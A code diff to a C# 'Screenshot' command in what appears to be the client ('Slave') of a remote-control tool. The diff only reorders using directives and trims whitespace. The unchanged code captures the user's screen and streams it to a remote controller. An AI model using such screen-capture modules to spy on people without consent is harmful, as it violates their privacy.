@@ -1,19 +1,18 @@
-﻿using System;
+﻿using Shared;
+using Slave.Commands.Core;
+using System;
 using System.Collections.Generic;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
-using Shared;
-using Slave.Commands.Core;
 
 namespace Slave.Commands
 {
     internal class Screenshot : ICommand
     {
         public string name { get; } = "screenshot";
-
 
         public void Process(List<string> args)
         {
@@ -29,7 +28,7 @@ namespace Slave.Commands
 
                     bitmap.Save(ms, ImageFormat.Png);
                 }
-                
+
                 SlaveCommandsManager.networkManager.StreamToNetworkStream(ms);
             }
         }
@@ -52,14 +51,12 @@ namespace Slave.Commands
             return new Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
         }
 
-
         enum ProcessDPIAwareness
         {
             ProcessDPIUnaware = 0,
             ProcessSystemDPIAware = 1,
             ProcessPerMonitorDPIAware = 2
         }
-
 
         [DllImport("shcore.dll")]
         static extern int SetProcessDpiAwareness(ProcessDPIAwareness value);
